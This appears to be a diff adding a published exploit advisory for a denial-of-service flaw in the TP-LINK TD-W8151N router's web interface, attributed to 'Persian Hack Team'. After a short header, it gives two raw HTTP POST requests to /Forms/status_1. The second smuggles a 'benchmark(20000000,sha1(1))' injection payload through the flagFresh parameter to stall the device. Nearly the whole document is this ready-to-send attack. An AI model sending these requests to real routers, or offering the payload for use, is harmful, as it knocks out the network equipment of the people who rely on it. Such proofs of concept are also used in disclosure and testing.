@@ -1,0 +1,39 @@
+# Exploit Title: TP-LINK TD-W8151N - Denial of Service
+# Date: 2016-12-13
+# Exploit Author: Persian Hack Team
+# Discovered by : Mojtaba MobhaM
+# Home : http://persian-team.ir/
+# Tested on: Windows AND Linux
+# Demo : https://www.youtube.com/watch?v=WrGgHvhiCGg
+
+POC : 
+
+flagFresh Parameter Vulnerable
+
+POST /Forms/status_1 HTTP/1.1
+Host: 192.168.1.1
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Referer: http://192.168.1.1/status.html
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Cookie: sessionid=13df8bc9; Language=en; C0=%00; C1=%00
+
+flagFresh=0
+
+Request : 
+
+POST /Forms/status_1 HTTP/1.1
+Host: 192.168.1.1
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Referer: http://192.168.1.1/status.html
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Cookie: sessionid=13df8bc9; Language=en; C0=%00; C1=%00
+
+flagFresh=0&1 and benchmark(20000000%2csha1(1))--=1
